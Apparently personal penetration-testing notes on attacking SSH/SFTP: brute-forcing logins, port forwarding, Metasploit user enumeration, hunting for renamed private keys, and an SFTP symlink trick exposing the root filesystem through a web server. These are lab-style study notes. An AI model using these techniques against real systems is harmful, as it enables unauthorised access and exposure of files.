If I got the message “PTY allocation failed on channel 0” this means that SSHing functionality was disabled in the configuration file but I can still try to use SFTP

Other common file name for id_rsa is .monitor


brute-force an access to the underlying system

ssh <username>@<vicitm_ip>

#can be prevented by installing fail to ban
 brute force na access to the SFTP
sftp <username>@<vicitm_ip>

perform port forwarding (requires credentials)

ssh -L <attacker_port>:localhost:<interesting_port> <username>@<vicitm_ip>

                                 or

ssh -N -L  <attacker_port>:localhost:<interesting_port> <username>@<vicitm_ip>

User enumeration (metasploit module)
msfconsole
use /scanner/ssh/ssh_enumusers

 
Create symlink (requires credentials, web port open)

sftp <username>@<victim_ip>


Symlink <source_directory> <destination_directory>

(Link what directory to what directory)

Symlink / simon

Link main directory “/” to the “simon”

Then go to the browser 
http://<victim_ip>/simon 

And you should see the content of a main directory
